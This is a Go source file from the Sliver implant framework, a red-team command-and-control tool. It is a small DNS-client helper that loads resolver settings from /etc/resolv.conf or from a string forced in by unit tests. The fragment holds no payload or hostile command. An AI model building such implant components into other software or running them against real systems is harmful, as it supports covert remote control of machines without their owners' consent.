//go:build !windows

package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"strings"

	"github.com/miekg/dns"
)

var (
	forceResolvConf = ``
)

// {{if .Config.Debug}} - Unit tests only
func SetForceResolvConf(conf string) {
	forceResolvConf = conf
}

// {{end}}

// dnsClientConfig - returns all DNS server addresses associated with the given address
// on non-windows, we ignore the ip parameter because routing is not insane
func dnsClientConfig() (*dns.ClientConfig, error) {
	if 0 < len(forceResolvConf) {
		return dns.ClientConfigFromReader(strings.NewReader(forceResolvConf))
	}
	return dns.ClientConfigFromFile("/etc/resolv.conf")
}
